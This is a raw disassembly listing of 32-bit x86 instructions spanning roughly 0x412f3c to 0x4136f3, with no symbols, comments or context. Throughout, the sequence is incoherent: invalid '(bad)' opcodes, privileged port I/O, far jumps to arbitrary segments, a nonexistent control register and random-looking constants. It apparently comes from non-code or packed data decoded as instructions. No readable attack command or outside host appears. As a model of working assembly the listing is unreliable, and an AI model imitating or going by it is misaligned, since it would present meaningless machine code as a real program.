  412f3c:	fisub  DWORD PTR [eax-0x2]
  412f3f:	pop    esi
  412f40:	xor    dh,BYTE PTR [edi]
  412f42:	mov    gs,WORD PTR [ebx]
  412f44:	dec    ebp
  412f45:	mov    bl,0x28
  412f47:	ins    DWORD PTR es:[edi],dx
  412f48:	jle    0x412fb5
  412f4a:	mov    BYTE PTR [edi-0x2e95acf2],ah
  412f50:	push   0x81b7ff88
  412f55:	test   DWORD PTR [ecx+ebp*2-0x13e40551],ebx
  412f5c:	test   DWORD PTR [ebp-0x19ee44ed],0x5681a54d
  412f66:	fsubr  QWORD PTR [edx+0x7199ada7]
  412f6c:	push   cs
  412f6d:	and    bl,BYTE PTR [edx+0x13]
  412f70:	ja     0x412fe7
  412f72:	xor    DWORD PTR [eax+0x27ea596e],ecx
  412f78:	nop
  412f79:	jae    0x412f41
  412f7b:	xchg   esp,eax
  412f7c:	jle    0x412f2d
  412f7e:	fnstcw WORD PTR [esi+0x6b]
  412f81:	dec    ebx
  412f82:	cmp    bh,BYTE PTR [ebp-0x2]
  412f85:	inc    esi
  412f86:	sahf   
  412f87:	jmp    0x5f35:0x61db6781
  412f8e:	mov    bl,0x20
  412f90:	aaa    
  412f91:	fs pop ebp
  412f93:	adc    DWORD PTR [edi+esi*1+0x3],ebx
  412f97:	fwait
  412f98:	mov    bh,0xb0
  412f9a:	aas    
  412f9b:	cs call 0x2f907882
  412fa1:	xor    ah,bh
  412fa3:	xchg   esi,eax
  412fa4:	cmc    
  412fa5:	add    eax,0x2a17feba
  412faa:	test   al,0xb2
  412fac:	cmp    al,0xc3
  412fae:	mov    ebx,0x1dfa4936
  412fb3:	cmp    esp,DWORD PTR [ecx]
  412fb5:	sub    edx,0x59dc4105
  412fbb:	adc    ecx,edi
  412fbd:	hlt    
  412fbe:	sar    BYTE PTR [eax-0x32],cl
  412fc1:	mov    esp,0xb1f4bab5
  412fc6:	sub    esi,ebx
  412fc8:	adc    al,0xb0
  412fca:	jbe    0x413023
  412fcc:	jo     0x412fa5
  412fce:	arpl   cx,si
  412fd0:	cmp    BYTE PTR [ebx+0x36],bh
  412fd3:	xchg   BYTE PTR [eax+0x3c],bl
  412fd6:	aas    
  412fd7:	repnz add cl,BYTE PTR [edx-0x4a]
  412fdb:	fcomp  DWORD PTR ds:0x365299aa
  412fe1:	es jbe 0x41301d
  412fe4:	test   ebp,ebx
  412fe6:	mov    al,0x8c
  412fe8:	lea    ebx,[esi+0x75]
  412feb:	cmp    al,0x56
  412fed:	sub    ch,BYTE PTR [edx]
  412fef:	in     al,0xde
  412ff1:	pop    eax
  412ff2:	js     0x413050
  412ff4:	shr    BYTE PTR [ecx+ecx*2+0x2b],cl
  412ff8:	adc    bl,0x5b
  412ffb:	jmp    0xa6e:0x2c267324
  413002:	dec    eax
  413003:	jae    0x41302c
  413005:	pop    ss
  413006:	mov    ah,0xac
  413008:	sbb    DWORD PTR [edx+0x3],eax
  41300b:	in     eax,0xbf
  41300d:	leave  
  41300e:	sbb    eax,0xff486d34
  413013:	xor    BYTE PTR [edx+0x18],bl
  413016:	(bad)  
  413017:	cmp    eax,0xcee99d4c
  41301c:	cmp    DWORD PTR [ecx],ecx
  41301e:	push   eax
  41301f:	adc    al,0xff
  413021:	dec    esp
  413022:	lods   al,BYTE PTR ds:[esi]
  413023:	sti    
  413024:	shl    DWORD PTR [edi+ebx*4+0x6e94dd15],cl
  41302b:	pop    esi
  41302c:	lods   al,BYTE PTR ds:[esi]
  41302d:	xchg   esp,eax
  41302e:	in     eax,0xbe
  413030:	out    dx,eax
  413031:	arpl   WORD PTR [ebp-0x6f],cx
  413034:	(bad)  
  413035:	sbb    dh,cl
  413037:	ret    
  413038:	jge    0x41304c
  41303a:	jns    0x413048
  41303c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41303d:	push   ebp
  41303e:	adc    cl,dl
  413040:	push   esi
  413041:	mov    bh,0xc3
  413043:	test   DWORD PTR [ecx+0x13],0x2ebcfcfb
  41304a:	jp     0x412ff6
  41304c:	push   0xe5c68654
  413051:	sbb    esp,edi
  413053:	fidivr WORD PTR [ebx+0x1cb25d8b]
  413059:	xor    al,0x3a
  41305b:	out    0xbc,al
  41305d:	push   esi
  41305e:	mov    al,ds:0x462e636b
  413063:	jecxz  0x41300d
  413065:	aaa    
  413066:	or     eax,0xa8874b98
  41306b:	les    esp,FWORD PTR [ecx-0x4a]
  41306e:	sub    bh,dl
  413070:	xchg   ebx,eax
  413071:	aad    0x1
  413073:	dec    esi
  413074:	mov    ebx,0x3d8b4bb7
  413079:	daa    
  41307a:	jae    0x413059
  41307c:	cmp    ecx,ecx
  41307e:	das    
  41307f:	repz xor BYTE PTR [esi],bh
  413082:	push   esi
  413083:	mov    ebx,0xa48a6995
  413088:	ficomp WORD PTR [ebx]
  41308a:	pop    ebx
  41308b:	pushf  
  41308c:	push   0x2d37a7a1
  413091:	test   eax,0x38f20dc3
  413096:	xchg   ebp,eax
  413097:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413098:	push   ds
  413099:	adc    eax,0x62716186
  41309e:	xor    esp,esi
  4130a0:	pop    ebp
  4130a1:	mov    WORD PTR [ebx+edx*8],fs
  4130a4:	stos   DWORD PTR es:[edi],eax
  4130a5:	dec    DWORD PTR [ebp-0x55]
  4130a8:	pop    ds
  4130a9:	sub    DWORD PTR [ebx-0x7e645697],esp
  4130af:	es jmp 0xd70c:0x4f65a2ac
  4130b7:	in     al,dx
  4130b8:	xchg   edi,eax
  4130b9:	outs   dx,DWORD PTR ds:[esi]
  4130ba:	cwde   
  4130bb:	mov    esi,0xcff03e32
  4130c0:	lea    esp,[ebp-0x47]
  4130c3:	or     ebx,edx
  4130c5:	cmp    DWORD PTR [ebx-0x794e4df6],ecx
  4130cb:	xlat   BYTE PTR ds:[ebx]
  4130cc:	hlt    
  4130cd:	jbe    0x4130e6
  4130cf:	adc    eax,0xb4a3ff78
  4130d4:	jge    0x41313e
  4130d6:	and    DWORD PTR [eax+eiz*8-0x10],0xffffffde
  4130db:	les    edx,FWORD PTR [eax+eiz*1-0x80]
  4130df:	xor    edi,0xffffffc0
  4130e2:	stos   DWORD PTR es:[edi],eax
  4130e3:	jno    0x413094
  4130e5:	imul   esi,DWORD PTR [esi],0x25
  4130e8:	imul   ecx,DWORD PTR [edi+0x51],0x3c
  4130ec:	retf   0x9f12
  4130ef:	out    0xa8,al
  4130f1:	add    dl,BYTE PTR [ebx+edx*8+0x580da39e]
  4130f8:	fdivp  st(3),st
  4130fa:	clc    
  4130fb:	inc    edi
  4130fc:	xchg   ebx,eax
  4130fd:	sbb    ch,dh
  4130ff:	mov    dh,0x9b
  413101:	pop    ebx
  413102:	(bad)  
  413103:	ds out dx,eax
  413105:	lods   eax,DWORD PTR ds:[esi]
  413106:	sbb    DWORD PTR [edi+0x3813ed51],esp
  41310c:	mov    ebx,0x454c3329
  413111:	add    eax,0x93015dd8
  413116:	sbb    al,0x86
  413118:	popa   
  413119:	stc    
  41311a:	imul   ecx,DWORD PTR [ebx],0xb63926f1
  413120:	sti    
  413121:	or     al,BYTE PTR [edi-0x1f9fa15f]
  413127:	sub    edi,DWORD PTR [esi]
  413129:	pop    ds
  41312a:	mov    esp,0x6b7182da
  41312f:	loop   0x413117
  413131:	nop
  413132:	add    al,0xbd
  413134:	sub    BYTE PTR [edi+0x67],ch
  413137:	pop    ebx
  413138:	pop    eax
  413139:	ret    0xd804
  41313c:	add    eax,0x727bfe01
  413141:	mov    cl,0xaa
  413143:	popa   
  413144:	call   0x82c7:0x327c3260
  41314b:	jo     0x413168
  41314d:	xor    eax,0x8745a372
  413152:	xchg   ebx,eax
  413153:	cmp    DWORD PTR [ebp+0x2743e248],0xffffff88
  41315a:	scas   eax,DWORD PTR es:[edi]
  41315b:	stc    
  41315c:	adc    BYTE PTR [eax-0x3d],ah
  41315f:	or     esi,DWORD PTR [esi+edx*8]
  413162:	std    
  413163:	sub    BYTE PTR [esi],dl
  413165:	cmp    BYTE PTR [eax-0x522b0737],bh
  41316b:	sub    esi,DWORD PTR [edx]
  41316d:	std    
  41316e:	or     eax,0x4e079779
  413173:	call   0x312dfa64
  413178:	mov    gs,WORD PTR [edi]
  41317a:	jo     0x4131e0
  41317c:	push   0x2d
  41317e:	push   ecx
  41317f:	dec    edx
  413180:	sbb    ecx,eax
  413182:	inc    esi
  413183:	mov    cl,0xc1
  413185:	hlt    
  413186:	loop   0x413108
  413188:	and    al,0xa6
  41318a:	aaa    
  41318b:	(bad)  
  41318c:	int    0x58
  41318e:	in     al,dx
  41318f:	jne    0x4131c8
  413191:	xchg   esp,eax
  413192:	ins    DWORD PTR es:[edi],dx
  413193:	mov    fs,WORD PTR [ebp-0x6537e6e1]
  413199:	stos   DWORD PTR es:[edi],eax
  41319a:	cs dec ebp
  41319c:	cmp    eax,0x273c44e8
  4131a1:	in     al,0xd5
  4131a3:	ja     0x4131ad
  4131a5:	mov    eax,DWORD PTR [ecx+0x35]
  4131a8:	inc    ebx
  4131a9:	sbb    eax,0x45c96fa0
  4131ae:	(bad)  
  4131af:	jle    0x4131b4
  4131b1:	loop   0x41319e
  4131b3:	ret    0x7357
  4131b6:	inc    esp
  4131b7:	ret    0x5986
  4131ba:	jge    0x41321e
  4131bc:	jg     0x413143
  4131be:	mov    dl,0xd6
  4131c0:	cmp    al,0x91
  4131c2:	pusha  
  4131c3:	popa   
  4131c4:	int3   
  4131c5:	xor    edi,ebx
  4131c7:	push   es
  4131c8:	jmp    0xe997:0x3b396f4
  4131cf:	inc    ebx
  4131d0:	fisubr DWORD PTR [ecx]
  4131d2:	lods   eax,DWORD PTR ds:[esi]
  4131d3:	fisttp WORD PTR [edx+0x6c02a22a]
  4131d9:	sub    esp,DWORD PTR [ecx]
  4131db:	dec    edx
  4131dc:	pop    esi
  4131dd:	mov    edi,0x557f12fa
  4131e2:	or     esi,DWORD PTR [edi+0x5b]
  4131e5:	inc    edi
  4131e6:	out    0x44,eax
  4131e8:	sub    DWORD PTR [eax],0xffffffad
  4131eb:	pop    ebp
  4131ec:	cmp    eax,DWORD PTR [ecx]
  4131ee:	cmp    BYTE PTR [ecx-0x558d7f83],al
  4131f4:	stos   BYTE PTR es:[edi],al
  4131f5:	mov    ah,0x6b
  4131f7:	ficomp WORD PTR [esi]
  4131f9:	add    ecx,DWORD PTR [edi]
  4131fb:	ins    BYTE PTR es:[edi],dx
  4131fc:	xchg   esp,eax
  4131fd:	push   cs
  4131fe:	mov    ecx,0x2b106918
  413203:	pop    ebx
  413204:	mov    BYTE PTR [ebx],ch
  413206:	mov    edx,0xc34232c4
  41320b:	xor    ecx,edi
  41320d:	mov    dl,0x9a
  41320f:	cmp    DWORD PTR [ebp+0x46416160],edi
  413215:	es or  bh,ah
  413218:	stos   DWORD PTR es:[edi],eax
  413219:	xor    al,0xd2
  41321b:	popf   
  41321c:	sti    
  41321d:	shl    ebx,0x1
  413220:	in     eax,dx
  413221:	xor    DWORD PTR ds:[ebx-0x1e],edi
  413225:	sbb    DWORD PTR [eax-0x6710aaa],edx
  41322b:	inc    ebx
  41322c:	stc    
  41322d:	mov    bh,dl
  41322f:	fwait
  413230:	lds    edi,FWORD PTR [esi]
  413232:	outs   dx,DWORD PTR ds:[esi]
  413233:	adc    eax,0xd66c19ea
  413238:	loop   0x4131e0
  41323a:	push   0x9be3275e
  41323f:	cmp    cl,BYTE PTR [edi+ebx*8-0xc29b66f]
  413246:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413247:	xchg   edi,eax
  413248:	jo     0x4131e2
  41324a:	mov    bh,0xbe
  41324c:	jnp    0x413250
  41324e:	add    bh,BYTE PTR ds:0x269c6f16
  413254:	addr16 xchg ecx,eax
  413256:	inc    ebp
  413257:	add    ebx,DWORD PTR [esi-0x1dd095a8]
  41325d:	ret    
  41325e:	pop    es
  41325f:	sub    ah,dh
  413261:	xchg   edx,eax
  413262:	ss loopne 0x4132c3
  413265:	arpl   WORD PTR [edi],bp
  413267:	shl    BYTE PTR [edi-0x69ff8840],cl
  41326d:	neg    BYTE PTR [eax+0x2810196c]
  413273:	and    al,0xc
  413275:	jb     0x4132c3
  413277:	imul   esi,DWORD PTR [edi-0xf1a9a8c],0x612401f2
  413281:	call   0x777ea6aa
  413286:	std    
  413287:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413288:	jl     0x413232
  41328a:	adc    al,0xb5
  41328c:	jmp    0x413232
  41328e:	loopne 0x4132e7
  413290:	(bad)  
  413291:	adc    dh,al
  413293:	rcr    ah,cl
  413295:	nop
  413296:	scas   eax,DWORD PTR es:[edi]
  413297:	xchg   ebx,eax
  413298:	cdq    
  413299:	imul   ecx,DWORD PTR [ecx+0xd],0x3b8f8605
  4132a0:	adc    eax,0x709306a2
  4132a5:	ret    0x7bdf
  4132a8:	or     esi,ebp
  4132aa:	add    eax,0x8d38d321
  4132af:	int3   
  4132b0:	fdiv   DWORD PTR [ebx]
  4132b2:	pop    edx
  4132b3:	(bad)  
  4132b4:	pushf  
  4132b5:	loope  0x413327
  4132b7:	push   0xffffffa4
  4132b9:	outs   dx,DWORD PTR ds:[esi]
  4132ba:	adc    eax,0x9618ffc
  4132bf:	test   BYTE PTR [esi],dh
  4132c1:	sti    
  4132c2:	aas    
  4132c3:	ss cld 
  4132c5:	test   BYTE PTR [edx+edi*2+0x33],al
  4132c9:	aas    
  4132ca:	and    dh,al
  4132cc:	jb     0x4132fc
  4132ce:	loop   0x4132e6
  4132d0:	mov    ah,0xdd
  4132d2:	cmp    esp,esi
  4132d4:	adc    eax,0x955b4fb9
  4132d9:	nop
  4132da:	call   0xb89e:0xf43c65b9
  4132e1:	test   DWORD PTR [eax-0x62],eax
  4132e4:	inc    ebx
  4132e5:	fs loopne 0x4132b3
  4132e8:	mov    eax,ds:0x97706e7
  4132ed:	shr    bh,cl
  4132ef:	fldcw  WORD PTR [edi-0x1a]
  4132f2:	(bad)  
  4132f3:	sbb    ebp,DWORD PTR [ebx-0x551db88]
  4132f9:	sbb    edx,ebx
  4132fb:	xchg   BYTE PTR [ebx-0x482dbad6],bh
  413301:	stos   DWORD PTR es:[edi],eax
  413302:	mov    edi,0xc263c128
  413307:	mov    eax,ds:0xc4b7f705
  41330c:	(bad)  
  41330d:	jmp    0xcd6b83e3
  413312:	aaa    
  413313:	stos   DWORD PTR es:[edi],eax
  413314:	adc    edx,DWORD PTR [edi+edi*2+0x6b]
  413318:	and    dl,BYTE PTR [ebx+ebp*4]
  41331b:	dec    esi
  41331c:	mov    eax,0x51945b58
  413321:	outs   dx,BYTE PTR ds:[esi]
  413322:	sar    BYTE PTR [edi+0x6c],0x4e
  413326:	inc    ebp
  413327:	iret   
  413328:	inc    BYTE PTR [edx+0x12]
  41332b:	fimul  WORD PTR [esi-0x269ce05a]
  413331:	fild   WORD PTR [ecx+0x7b]
  413334:	out    dx,al
  413335:	push   0xfffffff5
  413337:	ret    0x51ce
  41333a:	mov    WORD PTR [esi+0x39],cs
  41333d:	nop
  41333e:	xor    dl,ah
  413340:	fistp  QWORD PTR [edi+0x76]
  413343:	jecxz  0x4133a6
  413345:	sbb    edx,ecx
  413347:	jnp    0x413315
  413349:	adc    eax,0x55b3b49a
  41334e:	retf   
  41334f:	xor    cl,BYTE PTR [edx]
  413351:	inc    ecx
  413352:	cmp    BYTE PTR [ebp+0x2c56b9dc],bl
  413358:	lds    edx,FWORD PTR [ecx]
  41335a:	stc    
  41335b:	mov    al,ds:0xf1726d9b
  413360:	sub    dh,BYTE PTR [eax+0x3fa170c4]
  413366:	sar    BYTE PTR [ebx+0x20],cl
  413369:	add    BYTE PTR [ebx],0x1f
  41336c:	or     al,BYTE PTR [edi-0x14a6f96c]
  413372:	ins    BYTE PTR es:[edi],dx
  413373:	lods   eax,DWORD PTR ds:[esi]
  413374:	jge    0x4133a5
  413376:	hlt    
  413377:	lock push ebp
  413379:	sbb    cl,BYTE PTR [edx-0x78]
  41337c:	sbb    ebx,ebx
  41337e:	test   BYTE PTR [ebx-0x77dd8f73],0x6f
  413385:	jbe    0x413316
  413387:	lods   eax,DWORD PTR ds:[esi]
  413388:	push   ebp
  413389:	jb     0x4133bc
  41338b:	or     BYTE PTR [esi-0x44],al
  41338e:	fwait
  41338f:	cdq    
  413390:	js     0x413326
  413392:	mov    esp,0x9e9b626d
  413397:	push   edx
  413398:	fcmovnb st,st(3)
  41339a:	cld    
  41339b:	ja     0x41340a
  41339d:	int3   
  41339e:	cs repnz ins DWORD PTR es:[edi],dx
  4133a1:	cmp    DWORD PTR [ebx],edx
  4133a3:	jmp    0x9e0c9e99
  4133a8:	xor    esi,ebp
  4133aa:	mov    cl,0x60
  4133ac:	scas   eax,DWORD PTR es:[edi]
  4133ad:	enter  0xc20c,0x14
  4133b1:	pop    es
  4133b2:	xlat   BYTE PTR ds:[ebx]
  4133b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4133b4:	or     DWORD PTR [eax-0x1b],ebp
  4133b7:	and    BYTE PTR [eax-0x29],dl
  4133ba:	push   edx
  4133bb:	fsubr  st(5),st
  4133bd:	sbb    BYTE PTR [edi+0x7c],dh
  4133c0:	mov    al,0x61
  4133c2:	mov    WORD PTR [edi],gs
  4133c4:	or     DWORD PTR [ecx+0x26],edi
  4133c7:	adc    bl,BYTE PTR [ecx]
  4133c9:	cmp    ah,BYTE PTR [ebx-0x4295452a]
  4133cf:	adc    BYTE PTR [esi-0x2],dl
  4133d2:	xchg   ebx,eax
  4133d3:	fwait
  4133d4:	mov    gs,edi
  4133d6:	iret   
  4133d7:	add    eax,0x774acd7
  4133dc:	popf   
  4133dd:	out    0x64,eax
  4133df:	cld    
  4133e0:	dec    esp
  4133e1:	push   ds
  4133e2:	mov    bl,bh
  4133e4:	push   esi
  4133e5:	rol    esp,0x20
  4133e8:	gs (bad) 
  4133ea:	sti    
  4133eb:	xor    ecx,DWORD PTR [edx-0x5b]
  4133ee:	(bad)  
  4133ef:	fist   WORD PTR [edi-0x4a]
  4133f2:	ret    0x51a4
  4133f5:	mov    ds:0x27157a41,eax
  4133fa:	lock in eax,dx
  4133fc:	frstpm(287 only) 
  4133fe:	mov    ah,BYTE PTR [esi+0xa7d0a1]
  413404:	xor    ebp,esp
  413406:	push   esi
  413407:	in     eax,0x24
  413409:	or     al,0x1b
  41340b:	mov    bh,BYTE PTR [edi-0x76]
  41340e:	cmp    al,al
  413410:	inc    edi
  413411:	dec    edi
  413412:	mov    eax,0xe7f50f0a
  413417:	int3   
  413418:	hlt    
  413419:	loope  0x4133db
  41341b:	cmp    BYTE PTR ds:0x5726a0b3,ah
  413421:	pop    ebp
  413422:	mov    eax,0x83d77021
  413427:	imul   ebp,DWORD PTR [edi+0x7eb81a07],0xffffff91
  41342e:	(bad)  
  41342f:	and    al,0x7d
  413431:	in     eax,dx
  413432:	fimul  DWORD PTR [eax]
  413434:	das    
  413435:	xchg   DWORD PTR [eax-0x25],edx
  413438:	dec    edx
  413439:	popa   
  41343a:	xor    BYTE PTR [eax+0x3f],0x6c
  41343e:	sar    BYTE PTR [esi+0x2],0x4d
  413442:	xchg   esi,eax
  413443:	xchg   edx,eax
  413444:	push   ebp
  413445:	jbe    0x413444
  413447:	sub    al,0x1a
  413449:	fucomip st,st(0)
  41344b:	scas   al,BYTE PTR es:[edi]
  41344c:	pop    esi
  41344d:	and    ebx,esi
  41344f:	cld    
  413450:	fsubr  QWORD PTR [ecx-0x5]
  413453:	aaa    
  413454:	jg     0x4133f9
  413456:	mov    edx,0xb9b05992
  41345b:	inc    ecx
  41345c:	popf   
  41345d:	push   ecx
  41345e:	pop    ss
  41345f:	jae    0x41345a
  413461:	inc    ebp
  413462:	cwde   
  413463:	and    BYTE PTR [ebp+0x5a],al
  413466:	iret   
  413467:	nop
  413468:	out    dx,eax
  413469:	dec    ebx
  41346a:	add    esi,ebx
  41346c:	xor    ebp,esp
  41346e:	jns    0x41340a
  413470:	mov    cr5,ebx
  413473:	add    edi,eax
  413475:	faddp  st(1),st
  413477:	stc    
  413478:	cmp    DWORD PTR ds:0xa05ea3ae,0x9dd9b69d
  413482:	lea    esp,[ebx]
  413484:	cwde   
  413485:	(bad)  
  413486:	push   eax
  413487:	out    0x2e,al
  413489:	jge    0x41343a
  41348b:	sub    dh,bh
  41348d:	clc    
  41348e:	mov    ebp,esp
  413490:	jns    0x413434
  413492:	jg     0x41347a
  413494:	inc    edx
  413495:	xchg   esi,edi
  413497:	inc    eax
  413498:	xchg   esp,eax
  413499:	into   
  41349a:	lds    ebp,FWORD PTR [ebx+0x58]
  41349d:	sub    DWORD PTR [edx-0x1f93c0f0],0x5e
  4134a4:	ffreep st(6)
  4134a6:	mov    edx,0x9c737cf0
  4134ab:	cmc    
  4134ac:	sahf   
  4134ad:	loopne 0x4134e5
  4134af:	jns    0x4134f5
  4134b1:	test   al,0x25
  4134b3:	ins    DWORD PTR es:[edi],dx
  4134b4:	dec    esp
  4134b5:	fld    QWORD PTR [esi]
  4134b7:	or     bh,BYTE PTR [ebx]
  4134b9:	dec    esp
  4134ba:	outs   dx,DWORD PTR ds:[esi]
  4134bb:	xor    edi,esi
  4134bd:	imul   eax,DWORD PTR [edi],0xdb9b14b1
  4134c3:	adc    BYTE PTR [edx+0x1e],bh
  4134c6:	push   es
  4134c7:	jle    0x413521
  4134c9:	push   cs
  4134ca:	stc    
  4134cb:	shl    DWORD PTR [edi+0x3e835ffd],1
  4134d1:	stos   DWORD PTR es:[edi],eax
  4134d2:	in     eax,0xea
  4134d4:	jg     0x413464
  4134d6:	xchg   edi,eax
  4134d7:	inc    ebp
  4134d8:	cwde   
  4134d9:	or     bh,BYTE PTR ds:0xb7aca282
  4134df:	rcl    BYTE PTR [ecx+0x398b8267],cl
  4134e5:	xchg   ecx,eax
  4134e6:	fadd   QWORD PTR [ebx+0x1589905a]
  4134ec:	ret    0x2c6f
  4134ef:	xchg   esp,eax
  4134f0:	jp     0x41356c
  4134f2:	mov    ch,0x72
  4134f4:	call   0xfc3f9918
  4134f9:	mov    BYTE PTR [edx+0x73],dl
  4134fc:	inc    esi
  4134fd:	ds int 0x8d
  413500:	xchg   ebx,eax
  413501:	sub    eax,0x8ed52cf7
  413506:	adc    eax,0x3278f11c
  41350b:	or     ch,BYTE PTR [edi]
  41350d:	or     ch,bl
  41350f:	fsub   st(1),st
  413511:	lods   al,BYTE PTR ds:[esi]
  413512:	adc    eax,0x26348e3b
  413517:	ins    DWORD PTR es:[edi],dx
  413518:	lods   al,BYTE PTR ds:[esi]
  413519:	(bad)  
  41351c:	adc    DWORD PTR [edx-0x54],edx
  41351f:	push   ebp
  413520:	dec    ebx
  413521:	cmp    ah,bh
  413523:	jecxz  0x4134df
  413525:	in     eax,0x1a
  413527:	mov    ch,0xf9
  413529:	mov    edi,0x169f3cda
  41352e:	mov    edx,0x6989f5e3
  413533:	lods   al,BYTE PTR ds:[esi]
  413534:	inc    esp
  413535:	aas    
  413536:	jno    0x41355f
  413538:	mov    ebp,0xeb1dff32
  41353d:	hlt    
  41353e:	sub    DWORD PTR [ebp-0x39a52cae],ebp
  413544:	cmp    cl,dl
  413546:	aas    
  413547:	push   DWORD PTR ds:0xc9f5852b
  41354d:	out    dx,al
  41354e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41354f:	(bad)  
  413550:	mov    WORD PTR [edx+esi*2+0x664c2ff3],ss
  413557:	pop    edi
  413558:	mov    ds:0x46a32e26,eax
  41355d:	mov    ah,0x47
  41355f:	mov    al,0xfb
  413561:	loopne 0x41355f
  413563:	mov    eax,ds:0xcd8b0985
  413568:	inc    ebx
  413569:	add    eax,edx
  41356b:	sbb    dh,BYTE PTR [esi-0x48]
  41356e:	les    ecx,FWORD PTR [eax+0x3050dade]
  413574:	cld    
  413575:	push   ds
  413576:	lods   al,BYTE PTR ds:[esi]
  413577:	cmp    eax,DWORD PTR [edi]
  413579:	add    edi,esp
  41357b:	push   ds
  41357c:	loope  0x4135a0
  41357e:	push   0xef09ab8b
  413583:	cmp    esi,edx
  413585:	sub    al,BYTE PTR [eax+0x385563c0]
  41358b:	lods   eax,DWORD PTR ds:[esi]
  41358c:	mov    esp,ebx
  41358e:	push   ds
  41358f:	fucomi st,st(0)
  413591:	ret    
  413592:	jmp    0x6bb56268
  413597:	out    0x75,eax
  413599:	rol    DWORD PTR [eax],1
  41359b:	popa   
  41359c:	xor    BYTE PTR [ebx-0x138391ee],ch
  4135a2:	pop    ebx
  4135a3:	adc    DWORD PTR [ebp+0xcdaa14d],edi
  4135a9:	xchg   edi,eax
  4135aa:	or     eax,0x9a1ebccc
  4135af:	dec    edx
  4135b0:	(bad)  
  4135b1:	lods   eax,DWORD PTR ds:[esi]
  4135b2:	out    dx,eax
  4135b3:	pop    ebp
  4135b4:	mov    bl,0x82
  4135b6:	lahf   
  4135b7:	scas   al,BYTE PTR es:[edi]
  4135b8:	loope  0x413550
  4135ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135bb:	loope  0x4135bf
  4135bd:	lea    ebx,[edx]
  4135bf:	mov    dl,0x1f
  4135c1:	xchg   esi,eax
  4135c2:	inc    ebx
  4135c3:	icebp  
  4135c4:	mov    ch,0x50
  4135c6:	push   eax
  4135c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135c8:	jg     0x413620
  4135ca:	mov    ah,BYTE PTR [esi-0x4b]
  4135cd:	jmp    0xb8290173
  4135d2:	cwde   
  4135d3:	mov    BYTE PTR ds:0xa2f43766,0x4a
  4135da:	frstor [eax+0x71b85462]
  4135e0:	inc    edi
  4135e1:	pop    ds
  4135e2:	mov    esp,0x344c1bad
  4135e7:	cdq    
  4135e8:	hlt    
  4135e9:	int3   
  4135ea:	mul    DWORD PTR [ebx+eiz*8]
  4135ed:	aaa    
  4135ee:	or     ebx,DWORD PTR [edi]
  4135f0:	xor    bh,ah
  4135f2:	pop    ebx
  4135f3:	or     al,0x93
  4135f5:	ja     0x4135c0
  4135f7:	(bad)  
  4135f8:	(bad)  
  4135f9:	sub    eax,0xb3fef585
  4135fe:	push   bx
  413600:	sahf   
  413601:	dec    ebp
  413602:	or     al,0xf7
  413604:	inc    ebp
  413605:	jmp    0x41363f
  413607:	and    cl,BYTE PTR [eax+0x18]
  41360a:	ins    DWORD PTR es:[edi],dx
  41360b:	push   ecx
  41360c:	add    DWORD PTR [ebp+0x2a],esp
  41360f:	sbb    BYTE PTR [edx+0x4634afd0],bl
  413615:	cmp    esi,DWORD PTR [edi+0x4f]
  413618:	and    eax,0xc89fb61f
  41361d:	mov    edx,0x33cc1cc9
  413622:	mov    eax,ds:0x5bb66160
  413627:	cmp    DWORD PTR [edx+0x6],ecx
  41362a:	push   esp
  41362b:	fcom   st(6)
  41362d:	rcr    BYTE PTR [edx],0xf1
  413630:	or     eax,0x4cee8d20
  413635:	imul   esp,DWORD PTR [edi+0x29],0x65
  413639:	xor    eax,0xa8845f10
  41363e:	jge    0x4135eb
  413640:	dec    ecx
  413641:	out    dx,al
  413642:	scas   al,BYTE PTR es:[edi]
  413643:	jl     0x4135f8
  413645:	loopne 0x413663
  413647:	mov    ds:0x32c2dc31,eax
  41364c:	dec    eax
  41364d:	ins    BYTE PTR es:[edi],dx
  41364e:	arpl   sp,dx
  413650:	push   esp
  413651:	adc    ebp,DWORD PTR [ebx]
  413653:	dec    eax
  413654:	clc    
  413655:	gs jp  0x41369e
  413658:	xor    DWORD PTR [edx-0x5af804ef],esi
  41365e:	and    esp,ecx
  413660:	jge    0x4136be
  413662:	jns    0x413679
  413664:	add    eax,0x97d02ba1
  413669:	inc    eax
  41366a:	or     eax,0x65da9d1d
  41366f:	mov    eax,0xc3b0b911
  413674:	cmp    eax,0xa83f9dff
  413679:	shl    BYTE PTR [edx+ebp*8-0x49],cl
  41367d:	and    ah,cl
  41367f:	xchg   esp,eax
  413680:	fnsave ds:0xb79108ac
  413686:	jno    0x4136a8
  413688:	and    ebx,ecx
  41368a:	icebp  
  41368b:	fild   WORD PTR [ebp-0x321f8e60]
  413691:	pop    eax
  413692:	mov    edx,0x72628cbe
  413697:	repnz lods eax,DWORD PTR ds:[esi]
  413699:	popf   
  41369a:	dec    ebx
  41369b:	pop    esi
  41369c:	sbb    esp,DWORD PTR [ebp-0xe]
  41369f:	sar    BYTE PTR [edi+0x7b],1
  4136a2:	xor    esi,edi
  4136a4:	xchg   DWORD PTR [ebx+0x1735adee],ebp
  4136aa:	loope  0x413677
  4136ac:	xchg   edi,eax
  4136ad:	stos   DWORD PTR es:[edi],eax
  4136ae:	call   0xebcb:0xa1624338
  4136b5:	sub    eax,0x7f50f130
  4136ba:	xor    BYTE PTR [ebx],al
  4136bc:	pushf  
  4136bd:	cmp    ecx,DWORD PTR [edx+edx*8+0x48a58391]
  4136c4:	xor    DWORD PTR [ebx],ebp
  4136c6:	in     al,dx
  4136c7:	sub    DWORD PTR [esi],esi
  4136c9:	loopne 0x41373e
  4136cb:	mov    esp,es
  4136cd:	and    eax,DWORD PTR gs:[esi+esi*1+0x71]
  4136d2:	push   ebp
  4136d3:	dec    ebx
  4136d4:	pushf  
  4136d5:	mov    ecx,0x677ce67c
  4136da:	inc    ebp
  4136db:	and    cl,cl
  4136dd:	clc    
  4136de:	(bad)  
  4136e0:	repz in al,0x57
  4136e3:	jb     0x4136ff
  4136e5:	pop    es
  4136e6:	mov    dh,0x21
  4136e8:	or     al,0xf0
  4136ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4136eb:	inc    ebx
  4136ec:	sub    al,0x8f
  4136ee:	gs and ah,al
  4136f1:	mov    al,0x19
  4136f3:	dec    esi
